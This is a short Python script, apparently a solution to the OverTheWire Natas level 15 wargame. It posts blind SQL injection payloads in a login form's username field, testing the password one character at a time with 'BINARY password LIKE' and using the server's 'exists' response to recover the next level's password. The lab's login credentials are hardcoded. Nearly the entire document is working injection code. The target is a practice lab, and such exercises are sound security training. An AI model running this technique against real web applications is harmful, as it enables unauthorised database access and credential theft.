import requests

nocase = "waiheacj63wnnibroheqi3p9t0m5nhmh"
cased = ""

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

sql = 'natas16" AND BINARY password LIKE "'

for letter in nocase:
    data = {"username": sql + cased + letter + "%"}
    req = requests.post(url, data=data, auth=auth)
    res = req.text
    if "exists" in res:
        cased += letter
    else:
        cased += letter.upper()

print("done : " + cased)
